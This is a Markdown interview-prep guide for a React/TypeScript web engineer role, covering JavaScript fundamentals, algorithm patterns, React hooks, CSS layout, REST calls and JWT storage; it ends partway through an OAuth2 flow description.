# AEON360 Web Engineer â€” Interview Prep Guide

**Role:** Web Engineer (Manager Grade) Â· AEON360 Sdn. Bhd.  
**Assessment platform:** Coderbyte  
**Stack focus:** React Â· TypeScript Â· REST APIs Â· CSS Â· Security Â· Performance

---

## How to use this guide

Work through the phases in order. Each phase is self-contained but builds on the last. Time estimates assume ~2â€“3 hours of focused study per day. Adjust if your interview is sooner.

**Phases at a glance:**

| Phase  | Topic                             | Priority                          |
| ------ | --------------------------------- | --------------------------------- |
| 1      | JavaScript & TypeScript Core      | Critical                          |
| 2      | React & Component Patterns        | Critical                          |
| 3      | Responsive CSS & Layout           | High                              |
| 4      | REST APIs, Auth & Security        | High                              |
| 5      | Web Performance & Core Web Vitals | Medium                            |
| 6      | Testing                           | Medium                            |
| 7      | CI/CD & Git                       | Low (conceptual)                  |
| **8**  | **Frontend System Design**        | **Critical (physical interview)** |
| **9**  | **Behavioral Interview (STAR)**   | **Critical (physical interview)** |
| **10** | **5-Day Study Plan (June 4-9)**   | **High**                          |

---

## Phase 1 â€” JavaScript & TypeScript Core

**Why it's first:** Coderbyte algorithmic challenges run in vanilla JS/TS. Every other phase depends on solid JS fundamentals.

### 1.1 Must-know JavaScript

#### Array methods

```js
// Know these cold â€” they appear in almost every challenge
const nums = [1, 2, 3, 4, 5];

nums.filter((n) => n % 2 === 0); // [2, 4]
nums.map((n) => n * 2); // [2, 4, 6, 8, 10]
nums.reduce((acc, n) => acc + n, 0); // 15
nums.find((n) => n > 3); // 4
nums.some((n) => n > 4); // true
nums.every((n) => n > 0); // true
nums.flat(); // flattens one level
nums.flatMap((n) => [n, n * 2]); // map + flatten in one pass
```

##### Deep dive: How `reduce` works internally

`reduce` is the most powerful array method â€” every other array method can be implemented with it.

```js
// Signature: arr.reduce(callback, initialValue)
// callback receives: (accumulator, currentValue, index, array)

// Example 1: Sum all numbers
const nums = [10, 20, 30];
const sum = nums.reduce((acc, n) => acc + n, 0);
// Step by step:
// acc=0,  n=10  â†’ return 0 + 10 = 10
// acc=10, n=20  â†’ return 10 + 20 = 30
// acc=30, n=30  â†’ return 30 + 30 = 60
// Final: 60

// Example 2: Group objects by property
const users = [
  { name: "Alice", role: "admin" },
  { name: "Bob", role: "user" },
  { name: "Charlie", role: "admin" },
];

const grouped = users.reduce((acc, user) => {
  if (!acc[user.role]) acc[user.role] = [];
  acc[user.role].push(user);
  return acc;
}, {});
// Result: { admin: [Alice, Charlie], user: [Bob] }

// Example 3: Flatten nested arrays
const nested = [[1, 2], [3, 4], [5]];
const flat = nested.reduce((acc, arr) => acc.concat(arr), []);
// Result: [1, 2, 3, 4, 5]

// Example 4: Count frequency
const letters = ["a", "b", "a", "c", "b", "a"];
const freq = letters.reduce((acc, letter) => {
  acc[letter] = (acc[letter] || 0) + 1;
  return acc;
}, {});
// Result: { a: 3, b: 2, c: 1 }
```

**Common use cases in interviews:**

- Summing, averaging, finding min/max
- Transforming arrays into objects (grouping, indexing by ID)
- Flattening nested structures
- Building complex data structures in one pass

#### Object manipulation

```js
const obj = { a: 1, b: 2, c: 3 };

Object.keys(obj); // ['a', 'b', 'c']
Object.values(obj); // [1, 2, 3]
Object.entries(obj); // [['a',1], ['b',2], ['c',3]]

// Spread to merge/override
const merged = { ...obj, d: 4, a: 99 }; // a is overridden

// Destructuring with defaults
const { a, b = 10, ...rest } = obj;
```

#### String methods to know

```js
str.includes("foo");
str.startsWith("bar");
str.split(",").join("-");
str.trim().toLowerCase();
str.replace(/\s+/g, "-");
str.padStart(5, "0"); // '00042'
```

#### Closures and scope

**Definition:** A closure is a function that remembers variables from its outer scope, even after that outer function has returned.

```js
// Classic closure trap â€” what does this log?
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 0); // logs 3, 3, 3 â€” var is function-scoped
}

// Why? Because by the time the timeouts execute, the loop has finished and i = 3.
// All three callbacks reference the SAME variable i.

// Fix 1: Use let (block-scoped â€” creates a new binding each iteration)
for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 0); // logs 0, 1, 2
}

// Fix 2: Create a new scope with IIFE (Immediately Invoked Function Expression)
for (var i = 0; i < 3; i++) {
  (function (captured) {
    setTimeout(() => console.log(captured), 0);
  })(i);
}
```

##### Practical closure use cases

```js
// Use case 1: Private variables (data encapsulation)
function createCounter() {
  let count = 0; // private â€” inaccessible from outside

  return {
    increment: () => ++count,
    decrement: () => --count,
    getCount: () => count,
  };
}

const counter = createCounter();
counter.increment(); // 1
counter.increment(); // 2
counter.getCount(); // 2
// counter.count is undefined â€” no direct access

// Use case 2: Function factories
function multiplyBy(factor) {
  return function (num) {
    return num * factor;
  };
}

const double = multiplyBy(2);
const triple = multiplyBy(3);
double(5); // 10
triple(5); // 15

// Use case 3: Event handlers that remember context
function setupButtons(items) {
  items.forEach((item) => {
    const button = document.createElement("button");
    button.textContent = item.name;
    button.onclick = () => console.log(`Clicked ${item.name}`);
    // Closure captures the specific 'item' for this iteration
    document.body.appendChild(button);
  });
}
```

**Interview tip:** If asked to explain closures, use this format:

1. "A closure is a function that retains access to variables from its outer scope."
2. Give the counter example (shows private state).
3. Mention the `var` loop trap and how `let` fixes it.

#### Promises and async/await

```js
// Promise chaining
fetch("/api/users")
  .then((res) => {
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    return res.json();
  })
  .then((data) => console.log(data))
  .catch((err) => console.error(err));

// async/await equivalent (prefer this style)
async function getUsers() {
  try {
    const res = await fetch("/api/users");
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    const data = await res.json();
    return data;
  } catch (err) {
    console.error(err);
  }
}

// Parallel fetches â€” don't await sequentially when independent
const [users, products] = await Promise.all([
  fetch("/api/users").then((r) => r.json()),
  fetch("/api/products").then((r) => r.json()),
]);
```

#### Event loop â€” conceptual understanding

**The JavaScript runtime model:**

- **Call stack** executes synchronous code (LIFO â€” last in, first out).
- **Microtask queue** (Promises, `queueMicrotask`) drains _completely_ before the next task.
- **Macrotask queue** (`setTimeout`, `setInterval`, I/O) runs _one task at a time_.
- **Key rule:** All microtasks run before the next macrotask.

```js
console.log("1");
setTimeout(() => console.log("2"), 0);
Promise.resolve().then(() => console.log("3"));
console.log("4");
// Output: 1, 4, 3, 2
```

##### Step-by-step execution trace

```js
console.log("A"); // 1
setTimeout(() => console.log("B"), 0); // 2
Promise.resolve().then(() => console.log("C")); // 3
Promise.resolve().then(() => console.log("D")); // 4
console.log("E"); // 5

// Execution order:
//
// [Call Stack]
// 1. console.log('A')  â†’ logs 'A'
// 2. setTimeout(...)   â†’ schedules 'B' in macrotask queue
// 3. Promise.then(...) â†’ schedules 'C' in microtask queue
// 4. Promise.then(...) â†’ schedules 'D' in microtask queue
// 5. console.log('E')  â†’ logs 'E'
//
// [Call stack now empty â€” check microtask queue]
// 6. console.log('C')  â†’ logs 'C'
// 7. console.log('D')  â†’ logs 'D'
//
// [Microtask queue empty â€” check macrotask queue]
// 8. console.log('B')  â†’ logs 'B'
//
// Final output: A, E, C, D, B
```

##### Common interview question: Nested promises vs setTimeout

```js
console.log("Start");

setTimeout(() => {
  console.log("Timeout 1");
  Promise.resolve().then(() => console.log("Promise in Timeout 1"));
}, 0);

Promise.resolve().then(() => {
  console.log("Promise 1");
  setTimeout(() => console.log("Timeout in Promise 1"), 0);
});

console.log("End");

// Output:
// Start
// End
// Promise 1                  â† microtask runs first
// Timeout 1                  â† then macrotask
// Promise in Timeout 1       â† microtask scheduled inside that macrotask runs immediately
// Timeout in Promise 1       â† macrotask scheduled inside microtask runs last
```

**Real-world implication:**

- Use `Promise.resolve().then(...)` to defer work but run before timers.
- Use `setTimeout(..., 0)` to defer work until after the current task + all microtasks.

### 1.3 Algorithmic patterns â€” with named problems

These patterns appear repeatedly in coding interviews. Master these and you can solve 80% of algorithm challenges.

#### Pattern 1: Two Pointers

**When to use:** Sorted arrays, finding pairs/triplets, in-place modifications.

```js
// Problem: Two Sum II (LeetCode #167) â€” array is sorted
// Find two numbers that add up to target
function twoSum(nums, target) {
  let left = 0,
    right = nums.length - 1;

  while (left < right) {
    const sum = nums[left] + nums[right];
    if (sum === target) return [left + 1, right + 1]; // 1-indexed
    if (sum < target)
      left++; // need a larger sum
    else right--; // need a smaller sum
  }
  return [];
}
// Time: O(n), Space: O(1)

// Problem: Remove Duplicates from Sorted Array (LeetCode #26)
function removeDuplicates(nums) {
  let writeIndex = 1; // where to write next unique element

  for (let readIndex = 1; readIndex < nums.length; readIndex++) {
    if (nums[readIndex] !== nums[readIndex - 1]) {
      nums[writeIndex] = nums[readIndex];
      writeIndex++;
    }
  }
  return writeIndex; // new length
}
// Time: O(n), Space: O(1)
```

#### Pattern 2: Sliding Window

**When to use:** Subarray/substring of specific length or condition, optimization problems.

```js
// Problem: Maximum Average Subarray I (LeetCode #643)
// Find contiguous subarray of length k with maximum average
function findMaxAverage(nums, k) {
  let sum = 0;
  for (let i = 0; i < k; i++) sum += nums[i]; // initial window

  let maxSum = sum;
  for (let i = k; i < nums.length; i++) {
    sum += nums[i] - nums[i - k]; // slide: add right, remove left
    maxSum = Math.max(maxSum, sum);
  }
  return maxSum / k;
}
// Time: O(n), Space: O(1)

// Problem: Longest Substring Without Repeating Characters (LeetCode #3)
function lengthOfLongestSubstring(s) {
  const seen = new Map(); // char â†’ last seen index
  let left = 0,
    maxLen = 0;

  for (let right = 0; right < s.length; right++) {
    if (seen.has(s[right]) && seen.get(s[right]) >= left) {
      left = seen.get(s[right]) + 1; // move left past the duplicate
    }
    seen.set(s[right], right);
    maxLen = Math.max(maxLen, right - left + 1);
  }
  return maxLen;
}
// Time: O(n), Space: O(min(n, charset size))
```

#### Pattern 3: Hash Map / Frequency Counter

**When to use:** Counting, finding duplicates, anagrams, frequency-based problems.

```js
// Problem: First Unique Character (LeetCode #387)
function firstUniqChar(s) {
  const freq = {};
  for (const ch of s) freq[ch] = (freq[ch] || 0) + 1;
  for (let i = 0; i < s.length; i++) {
    if (freq[s[i]] === 1) return i;
  }
  return -1;
}
// Time: O(n), Space: O(1) â€” charset is constant (26 letters)

// Problem: Group Anagrams (LeetCode #49)
function groupAnagrams(strs) {
  const groups = {};
  for (const str of strs) {
    const key = str.split("").sort().join(""); // anagrams have same sorted key
    if (!groups[key]) groups[key] = [];
    groups[key].push(str);
  }
  return Object.values(groups);
}
// Time: O(n * k log k) where k is max string length
```

#### Pattern 4: Stack

**When to use:** Balanced brackets, next greater element, undo operations, parsing.

```js
// Problem: Valid Parentheses (LeetCode #20)
function isValid(s) {
  const stack = [];
  const pairs = { ")": "(", "}": "{", "]": "[" };

  for (const ch of s) {
    if (ch in pairs) {
      if (stack.pop() !== pairs[ch]) return false; // mismatch
    } else {
      stack.push(ch); // opening bracket
    }
  }
  return stack.length === 0; // all matched
}
// Time: O(n), Space: O(n)

// Problem: Daily Temperatures (LeetCode #739)
// For each day, how many days until a warmer temperature?
function dailyTemperatures(temps) {
  const result = new Array(temps.length).fill(0);
  const stack = []; // indices of days waiting for warmer temp

  for (let i = 0; i < temps.length; i++) {
    while (stack.length && temps[i] > temps[stack[stack.length - 1]]) {
      const prevDay = stack.pop();
      result[prevDay] = i - prevDay;
    }
    stack.push(i);
  }
  return result;
}
// Time: O(n), Space: O(n)
```

#### Pattern 5: Fast & Slow Pointers (Floyd's Cycle Detection)

**When to use:** Linked lists, cycle detection, finding middle element.

```js
// Problem: Linked List Cycle (LeetCode #141)
function hasCycle(head) {
  let slow = head,
    fast = head;

  while (fast && fast.next) {
    slow = slow.next; // moves 1 step
    fast = fast.next.next; // moves 2 steps
    if (slow === fast) return true; // they met â€” cycle exists
  }
  return false;
}
// Time: O(n), Space: O(1)

// Problem: Middle of Linked List (LeetCode #876)
function middleNode(head) {
  let slow = head,
    fast = head;
  while (fast && fast.next) {
    slow = slow.next;
    fast = fast.next.next;
  }
  return slow; // when fast reaches end, slow is at middle
}
```

#### Pattern 6: Binary Search

**When to use:** Sorted array, search space can be halved each iteration.

```js
// Problem: Binary Search (LeetCode #704)
function search(nums, target) {
  let left = 0,
    right = nums.length - 1;

  while (left <= right) {
    const mid = Math.floor((left + right) / 2);
    if (nums[mid] === target) return mid;
    if (nums[mid] < target) left = mid + 1;
    else right = mid - 1;
  }
  return -1;
}
// Time: O(log n), Space: O(1)

// Problem: First Bad Version (LeetCode #278)
function firstBadVersion(n) {
  let left = 1,
    right = n;
  while (left < right) {
    const mid = Math.floor((left + right) / 2);
    if (isBadVersion(mid))
      right = mid; // answer is mid or earlier
    else left = mid + 1;
  }
  return left;
}
```

#### Pattern 7: Recursion & Backtracking

**When to use:** Tree traversal, combinatorial problems, generating permutations/subsets.

```js
// Problem: Generate Parentheses (LeetCode #22)
// Generate all valid combinations of n pairs of parentheses
function generateParenthesis(n) {
  const result = [];

  function backtrack(current, open, close) {
    if (current.length === 2 * n) {
      result.push(current);
      return;
    }
    if (open < n) backtrack(current + "(", open + 1, close);
    if (close < open) backtrack(current + ")", open, close + 1);
  }

  backtrack("", 0, 0);
  return result;
}
// Time: O(4^n / âˆšn) â€” Catalan number, Space: O(n) for recursion stack

// Problem: Subsets (LeetCode #78)
function subsets(nums) {
  const result = [];

  function backtrack(start, current) {
    result.push([...current]);
    for (let i = start; i < nums.length; i++) {
      current.push(nums[i]);
      backtrack(i + 1, current);
      current.pop();
    }
  }

  backtrack(0, []);
  return result;
}
```

#### Pattern 8: Dynamic Programming (1D)

**When to use:** Optimization problems with overlapping subproblems (Fibonacci, climbing stairs, coin change).

```js
// Problem: Climbing Stairs (LeetCode #70)
// You can climb 1 or 2 steps at a time. How many ways to reach step n?
function climbStairs(n) {
  if (n <= 2) return n;
  let prev2 = 1,
    prev1 = 2;
  for (let i = 3; i <= n; i++) {
    const current = prev1 + prev2;
    prev2 = prev1;
    prev1 = current;
  }
  return prev1;
}
// Time: O(n), Space: O(1) â€” optimized from O(n) DP array

// Problem: House Robber (LeetCode #198)
// Can't rob adjacent houses. Maximize amount stolen.
function rob(nums) {
  let prev2 = 0,
    prev1 = 0;
  for (const num of nums) {
    const current = Math.max(prev1, prev2 + num); // skip or rob
    prev2 = prev1;
    prev1 = current;
  }
  return prev1;
}
// Time: O(n), Space: O(1)
```

**Pattern recognition cheat sheet:**

| If problem mentions...                  | Try this pattern         |
| --------------------------------------- | ------------------------ |
| Sorted array + find pair/triplet        | Two Pointers             |
| Subarray/substring of length k          | Sliding Window           |
| Count frequencies, find duplicates      | Hash Map                 |
| Balanced brackets, parsing, undo        | Stack                    |
| Linked list cycle or middle             | Fast & Slow Pointers     |
| Sorted + search                         | Binary Search            |
| Generate all combinations               | Recursion + Backtracking |
| "What's the maximum/minimum ways to..." | Dynamic Programming      |

### 1.4 References

- [javascript.info](https://javascript.info) â€” read: Data types, Functions, Promises, Async/await, Classes
- [TypeScript Handbook](https://www.typescriptlang.org/docs/handbook/intro.html) â€” read: Everyday Types, Generics, Utility Types

### 1.5 Practice platforms

| Platform                     | Best for                                  | Difficulty          | Free tier               |
| ---------------------------- | ----------------------------------------- | ------------------- | ----------------------- |
| **LeetCode**                 | Algorithmic problems, patterns            | Easy â†’ Hard       | Yes (most problems)     |
| **HackerRank**               | Interview prep tracks, certificates       | Easy â†’ Medium     | Yes                     |
| **Coderbyte**                | AEON360 uses this â€” practice here first | Easy â†’ Hard       | Limited free challenges |
| **Frontend Mentor**          | Real UI challenges (HTML/CSS/JS/React)    | Junior â†’ Advanced | Yes                     |
| **StackBlitz / CodeSandbox** | Quick React/TS prototyping                | N/A                 | Yes                     |

**Recommendation:** Start with 10â€“15 LeetCode Easy problems covering the 8 patterns above, then move to Medium problems. If the interview platform is confirmed as Coderbyte, spend your last 3 days there to get familiar with the editor and submission flow.

---

## Phase 2 â€” React & Component Patterns

**Why it matters:** The JD explicitly names React. Coderbyte frontend challenges frequently ask you to build or fix a React component.

### 2.1 Hooks reference

#### useState

```jsx
const [count, setCount] = useState(0);

// Functional update â€” use when new state depends on old state
setCount((prev) => prev + 1);

// Lazy initial state â€” runs once, not on every render
const [data, setData] = useState(() =>
  JSON.parse(localStorage.getItem("data") ?? "[]"),
);
```

#### useEffect

```jsx
// Runs after every render â€” rarely what you want
useEffect(() => { ... });

// Runs once on mount (empty dependency array)
useEffect(() => { ... }, []);

// Runs when dependency changes
useEffect(() => {
  const controller = new AbortController();

  fetch(`/api/users/${id}`, { signal: controller.signal })
    .then(r => r.json())
    .then(setUser)
    .catch(err => {
      if (err.name !== 'AbortError') setError(err.message);
    });

  // Cleanup â€” cancels the request if component unmounts or id changes
  return () => controller.abort();
}, [id]);
```

#### useRef

```jsx
// Two uses: DOM reference and mutable value that doesn't trigger re-render
const inputRef = useRef<HTMLInputElement>(null);

// Access DOM
inputRef.current?.focus();

// Store a value without re-rendering
const intervalId = useRef<number | null>(null);
intervalId.current = setInterval(() => ..., 1000);
```

#### useCallback and useMemo

```jsx
// useCallback â€” memoize a function reference (use when passing to child components or deps arrays)
const handleSubmit = useCallback((e: React.FormEvent) => {
  e.preventDefault();
  // ...
}, [dependency]);

// useMemo â€” memoize an expensive computation
const sortedUsers = useMemo(
  () => [...users].sort((a, b) => a.name.localeCompare(b.name)),
  [users]
);
```

> **Common mistake:** Overusing `useCallback`/`useMemo`. Only add them when you can measure a performance problem, or when a function is a dependency in another hook.

#### useReducer

```jsx
type Action =
  | { type: 'increment' }
  | { type: 'decrement' }
  | { type: 'reset'; payload: number };

function reducer(state: number, action: Action): number {
  switch (action.type) {
    case 'increment': return state + 1;
    case 'decrement': return state - 1;
    case 'reset': return action.payload;
    default: return state;
  }
}

const [count, dispatch] = useReducer(reducer, 0);
dispatch({ type: 'increment' });
dispatch({ type: 'reset', payload: 10 });
```

#### useContext

```tsx
interface ThemeContextType {
  theme: "light" | "dark";
  toggle: () => void;
}

const ThemeContext = createContext<ThemeContextType | null>(null);

function ThemeProvider({ children }: { children: React.ReactNode }) {
  const [theme, setTheme] = useState<"light" | "dark">("light");
  const toggle = useCallback(
    () => setTheme((t) => (t === "light" ? "dark" : "light")),
    [],
  );
  return (
    <ThemeContext.Provider value={{ theme, toggle }}>
      {children}
    </ThemeContext.Provider>
  );
}

// Custom hook to consume context safely
function useTheme() {
  const ctx = useContext(ThemeContext);
  if (!ctx) throw new Error("useTheme must be used within ThemeProvider");
  return ctx;
}
```

### 2.2 Custom hooks pattern

```tsx
// Reusable fetch hook â€” extracting async logic out of components
function useFetch<T>(url: string) {
  const [data, setData] = useState<T | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    const controller = new AbortController();
    setLoading(true);

    fetch(url, { signal: controller.signal })
      .then((res) => {
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        return res.json() as Promise<T>;
      })
      .then((data) => {
        setData(data);
        setLoading(false);
      })
      .catch((err) => {
        if (err.name !== "AbortError") {
          setError(err.message);
          setLoading(false);
        }
      });

    return () => controller.abort();
  }, [url]);

  return { data, loading, error };
}

// Usage
function UserList() {
  const { data, loading, error } = useFetch<User[]>("/api/users");

  if (loading) return <p>Loading...</p>;
  if (error) return <p>Error: {error}</p>;
  return (
    <ul>
      {data?.map((u) => (
        <li key={u.id}>{u.name}</li>
      ))}
    </ul>
  );
}
```

### 2.3 Component patterns

#### Controlled form

```tsx
function LoginForm() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [errors, setErrors] = useState<{ email?: string; password?: string }>(
    {},
  );

  function validate() {
    const errs: typeof errors = {};
    if (!email.includes("@")) errs.email = "Enter a valid email";
    if (password.length < 8) errs.password = "Minimum 8 characters";
    return errs;
  }

  function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    const errs = validate();
    if (Object.keys(errs).length) {
      setErrors(errs);
      return;
    }
    // submit...
  }

  return (
    <form onSubmit={handleSubmit}>
      <label htmlFor="email">Email</label>
      <input
        id="email"
        type="email"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
      />
      {errors.email && <span role="alert">{errors.email}</span>}

      <label htmlFor="password">Password</label>
      <input
        id="password"
        type="password"
        value={password}
        onChange={(e) => setPassword(e.target.value)}
      />
      {errors.password && <span role="alert">{errors.password}</span>}

      <button type="submit">Log in</button>
    </form>
  );
}
```

#### Error boundary

```tsx
class ErrorBoundary extends React.Component<
  { children: React.ReactNode; fallback: React.ReactNode },
  { hasError: boolean }
> {
  state = { hasError: false };

  static getDerivedStateFromError() {
    return { hasError: true };
  }

  componentDidCatch(error: Error, info: React.ErrorInfo) {
    console.error("Boundary caught:", error, info);
  }

  render() {
    if (this.state.hasError) return this.props.fallback;
    return this.props.children;
  }
}
```

#### Optimistic UI updates

**Pattern:** Update UI immediately, then sync with server. If server fails, roll back.

```tsx
function TodoList() {
  const [todos, setTodos] = useState<Todo[]>([]);

  async function toggleTodo(id: number) {
    // 1. Optimistic update â€” instant feedback
    setTodos((prev) =>
      prev.map((todo) =>
        todo.id === id ? { ...todo, completed: !todo.completed } : todo,
      ),
    );

    // 2. Sync with server
    try {
      await fetch(`/api/todos/${id}/toggle`, { method: "PATCH" });
    } catch (err) {
      // 3. Rollback on failure
      setTodos((prev) =>
        prev.map((todo) =>
          todo.id === id ? { ...todo, completed: !todo.completed } : todo,
        ),
      );
      alert("Failed to update todo");
    }
  }

  return (
    <ul>
      {todos.map((todo) => (
        <li key={todo.id}>
          <input
            type="checkbox"
            checked={todo.completed}
            onChange={() => toggleTodo(todo.id)}
          />
          {todo.title}
        </li>
      ))}
    </ul>
  );
}
```

**Real-world use:** Chat apps, e-commerce carts, social media likes â€” anywhere instant feedback is critical.

#### Compound components pattern

**Pattern:** Components that work together, sharing implicit state without prop drilling.

```tsx
// API Design: <Select> and <Select.Option> share state implicitly
interface SelectContextType {
  value: string;
  onChange: (value: string) => void;
}

const SelectContext = createContext<SelectContextType | null>(null);

function Select({
  value,
  onChange,
  children,
}: {
  value: string;
  onChange: (value: string) => void;
  children: React.ReactNode;
}) {
  return (
    <SelectContext.Provider value={{ value, onChange }}>
      <div className="select">{children}</div>
    </SelectContext.Provider>
  );
}

function Option({
  value,
  children,
}: {
  value: string;
  children: React.ReactNode;
}) {
  const ctx = useContext(SelectContext);
  if (!ctx) throw new Error("Option must be used inside Select");

  return (
    <button
      className={ctx.value === value ? "active" : ""}
      onClick={() => ctx.onChange(value)}
    >
      {children}
    </button>
  );
}

Select.Option = Option;

// Usage â€” clean API, no prop drilling
function App() {
  const [color, setColor] = useState("red");
  return (
    <Select value={color} onChange={setColor}>
      <Select.Option value="red">Red</Select.Option>
      <Select.Option value="blue">Blue</Select.Option>
      <Select.Option value="green">Green</Select.Option>
    </Select>
  );
}
```

**Real-world use:** Tabs, Accordions, Dropdown menus â€” anywhere child components need shared state.

#### Render props pattern

**Pattern:** Pass a function as `children` to control rendering from the parent.

```tsx
// Reusable mouse tracker
function MouseTracker({
  render,
}: {
  render: (pos: { x: number; y: number }) => React.ReactNode;
}) {
  const [pos, setPos] = useState({ x: 0, y: 0 });

  useEffect(() => {
    const handleMove = (e: MouseEvent) =>
      setPos({ x: e.clientX, y: e.clientY });
    window.addEventListener("mousemove", handleMove);
    return () => window.removeEventListener("mousemove", handleMove);
  }, []);

  return <>{render(pos)}</>;
}

// Usage â€” parent controls what to render
function App() {
  return (
    <MouseTracker
      render={({ x, y }) => (
        <div
          style={{ position: "fixed", left: x, top: y, pointerEvents: "none" }}
        >
          ðŸŽ¯ ({x}, {y})
        </div>
      )}
    />
  );
}
```

**Real-world use:** Custom hooks have largely replaced this pattern, but it's still common in libraries (React Router's `<Route render={...} />`).

#### Data fetching strategies

```tsx
// Strategy 1: Fetch on mount (simplest)
function UserProfile({ userId }: { userId: number }) {
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    fetch(`/api/users/${userId}`)
      .then((r) => r.json())
      .then((data) => {
        setUser(data);
        setLoading(false);
      });
  }, [userId]);

  if (loading) return <p>Loading...</p>;
  return <div>{user.name}</div>;
}

// Strategy 2: Parallel fetching (Promise.all)
function Dashboard() {
  const [data, setData] = useState({ users: [], products: [], stats: {} });

  useEffect(() => {
    Promise.all([
      fetch("/api/users").then((r) => r.json()),
      fetch("/api/products").then((r) => r.json()),
      fetch("/api/stats").then((r) => r.json()),
    ]).then(([users, products, stats]) => {
      setData({ users, products, stats });
    });
  }, []);

  return <div>{/* render data */}</div>;
}

// Strategy 3: Sequential with dependency (waterfall â€” avoid if possible)
function PostWithComments({ postId }: { postId: number }) {
  const [post, setPost] = useState(null);
  const [comments, setComments] = useState([]);

  useEffect(() => {
    fetch(`/api/posts/${postId}`)
      .then((r) => r.json())
      .then(setPost);
  }, [postId]);

  useEffect(() => {
    if (!post) return; // wait for post to load first
    fetch(`/api/posts/${postId}/comments`)
      .then((r) => r.json())
      .then(setComments);
  }, [postId, post]);

  // Better: fetch both in parallel if postId is enough
}

// Strategy 4: Debounced search (avoid API spam)
function SearchUsers() {
  const [query, setQuery] = useState("");
  const [results, setResults] = useState([]);

  useEffect(() => {
    if (!query) {
      setResults([]);
      return;
    }

    const timer = setTimeout(() => {
      fetch(`/api/users/search?q=${encodeURIComponent(query)}`)
        .then((r) => r.json())
        .then(setResults);
    }, 300); // wait 300ms after user stops typing

    return () => clearTimeout(timer);
  }, [query]);

  return (
    <div>
      <input value={query} onChange={(e) => setQuery(e.target.value)} />
      <ul>
        {results.map((u) => (
          <li key={u.id}>{u.name}</li>
        ))}
      </ul>
    </div>
  );
}
```

### 2.4 What to be able to build in 30 minutes on Coderbyte

- A filterable/searchable list that fetches from a REST endpoint
- A multi-step form with validation
- A tab or accordion component with accessible keyboard nav
- An infinite scroll or paginated list

### 2.5 References

- [react.dev](https://react.dev) â€” "Describing the UI" and "Managing State" sections
- [ui.dev React hooks](https://ui.dev/react-hooks) â€” visual hook lifecycle explanations

---

## Phase 3 â€” Responsive CSS & Layout

### 3.1 Flexbox cheat sheet

```css
/* Container */
display: flex;
flex-direction: row | column;
justify-content: flex-start | center | flex-end | space-between | space-around |
  space-evenly;
align-items: stretch | flex-start | center | flex-end | baseline;
flex-wrap: nowrap | wrap;
gap: 1rem;

/* Item */
flex: 1; /* grow and shrink equally */
flex: 0 0 200px; /* fixed width, no grow/shrink */
align-self: flex-start; /* override align-items for one item */
order: 2; /* reorder visually without DOM change */
```

#### Common pattern: sticky footer

```css
body {
  min-height: 100vh;
  display: flex;
  flex-direction: column;
}
main {
  flex: 1;
}
```

### 3.2 CSS Grid cheat sheet

```css
/* Container */
display: grid;
grid-template-columns: repeat(3, 1fr); /* 3 equal columns */
grid-template-columns: 2fr 1fr; /* 2:1 ratio */
grid-template-columns: repeat(
  auto-fit,
  minmax(280px, 1fr)
); /* responsive without media queries */
gap: 1.5rem;
grid-template-areas:
  "header header"
  "sidebar main"
  "footer footer";

/* Item */
grid-column: 1 / 3; /* span 2 columns */
grid-row: 1 / span 2; /* span 2 rows */
grid-area: header; /* named area placement */
```

### 3.3 Responsive breakpoints (mobile-first)

```css
/* Base styles target mobile */
.container {
  padding: 1rem;
}

/* Tablet */
@media (min-width: 768px) {
  .container {
    padding: 2rem;
  }
}

/* Desktop */
@media (min-width: 1024px) {
  .container {
    padding: 3rem;
    max-width: 1200px;
    margin: 0 auto;
  }
}
```

#### Tailwind equivalents

```html
<!-- Mobile first, responsive prefix for larger screens -->
<div
  class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 p-4 md:p-8"
></div>
```

### 3.4 Fluid sizing without media queries

```css
/* clamp(min, preferred, max) */
font-size: clamp(1rem, 2.5vw, 1.5rem);
padding: clamp(1rem, 5vw, 3rem);
```

### 3.5 References

- [CSS Tricks Flexbox Guide](https://css-tricks.com/snippets/css/a-guide-to-flexbox/)
- [CSS Tricks Grid Guide](https://css-tricks.com/snippets/css/complete-guide-grid/)
- [Tailwind CSS Docs](https://tailwindcss.com/docs/utility-first)

---

## Phase 4 â€” REST APIs, Auth & Security

### 4.1 REST API consumption patterns

```ts
// Base fetch wrapper with error handling
async function apiFetch<T>(url: string, options?: RequestInit): Promise<T> {
  const res = await fetch(url, {
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bearer ${getToken()}`,
    },
    ...options,
  });

  if (!res.ok) {
    const body = await res.json().catch(() => ({}));
    throw new Error(body.message ?? `HTTP ${res.status}`);
  }

  return res.json() as Promise<T>;
}

// POST with body
await apiFetch<User>("/api/users", {
  method: "POST",
  body: JSON.stringify({ name: "Alice", email: "alice@example.com" }),
});
```

### 4.2 JWT â€” structure and storage

**Structure:** `header.payload.signature`

- **Header:** algorithm + token type (`{"alg":"HS256","typ":"JWT"}`)
- **Payload:** claims â€” `sub` (user id), `exp` (expiry), `iat` (issued at), custom fields
- **Signature:** HMAC of header + payload using a secret key

#### Storage tradeoffs

| Location                              | XSS Risk | CSRF Risk | Notes                                         |
| ------------------------------------- | -------- | --------- | --------------------------------------------- |
| `localStorage`                        | High     | None      | JS can read it â€” avoid for sensitive tokens |
| `sessionStorage`                      | High     | None      | Cleared on tab close, still readable by JS    |
| `httpOnly` cookie                     | None     | Moderate  | Cannot be read by JS â€” safest option        |
| `httpOnly` cookie + `SameSite=Strict` | None     | None      | Best practice                                 |

```ts
// Reading a JWT payload (client-side, no library needed)
function parseJwt(token: string) {
  const base64 = token.split(".")[1].replace(/-/g, "+").replace(/_/g, "/");
  return JSON.parse(window.atob(base64));
}
```

### 4.3 OAuth2 â€” Authorization Code Flow

**Overview:** OAuth2 lets users grant your app access to their data on another service (Google, GitHub, etc.) without sharing their password.

#### Step-by-step flow with code

```
1. User clicks "Log in with Google"
2. App redirects to: https://accounts.google.com/o/oauth2/auth?
     client_id=YOUR_CLIENT_ID
     &redirect_uri=https://yourapp.com/callback
     &response_type=code
